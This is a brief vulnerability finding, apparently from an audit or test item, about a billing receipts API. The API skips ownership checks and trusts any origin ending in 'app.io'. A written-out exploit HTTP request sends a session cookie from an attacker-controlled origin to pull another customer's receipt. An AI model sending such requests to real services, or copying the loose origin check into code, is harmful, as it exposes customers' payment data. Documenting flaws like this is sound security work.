diagnosis: CustomerReceiptView retrieves billing receipts without verifying customer ownership (customer=request.user). Furthermore, it checks origin using origin.endswith('app.io') without domain dot delimiters, allowing an attacker controlling 'evilapp.io' to pass CORS validation with Access-Control-Allow-Credentials: true and extract other customers' payment records and billing addresses via authenticated cross-origin browser requests.
exploit_request:
GET /api/billing/receipts/RCP-2026-8812/ HTTP/1.1
Host: billing.payments-app.io
Origin: https://attackerapp.io
Cookie: sessionid=customer_cookie_session
Accept: application/json
